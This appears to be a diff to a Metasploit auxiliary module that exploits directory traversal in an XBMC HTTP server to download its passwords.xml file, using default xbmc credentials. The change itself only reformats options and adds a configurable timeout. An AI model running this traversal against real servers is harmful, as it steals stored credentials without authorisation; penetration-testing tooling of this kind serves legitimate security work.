@@ -36,11 +36,16 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new('FILEPATH', [false, 'The name of the file to download', '/private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml']),
-        OptInt.new('DEPTH', [true, 'The max traversal depth', 9]),
-        OptString.new('USERNAME', [true, 'The username to use for the HTTP server', 'xbmc']),
-        OptString.new('PASSWORD', [false, 'The password to use for the HTTP server', 'xbmc']),
+        OptString.new('FILEPATH', [ false, 'The name of the file to download', '/private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml' ]),
+        OptInt.new('DEPTH', [ true, 'The max traversal depth', 9 ]),
+        OptString.new('USERNAME', [ true, 'The username to use for the HTTP server', 'xbmc' ]),
+        OptString.new('PASSWORD', [ false, 'The password to use for the HTTP server', 'xbmc' ]),
+        OptInt.new('TIMEOUT', [ true, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT']
   end
 
   def run
@@ -57,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
         'method' => 'GET',
         'uri'    => "/#{traversal}/#{datastore['FILEPATH']}",
         'authorization' => basic_auth(datastore['USERNAME'],datastore['PASSWORD'])
-      }, 25)
+      }, timeout)
     rescue Rex::ConnectionRefused
       print_error("#{rhost}:#{rport} Could not connect.")
       return
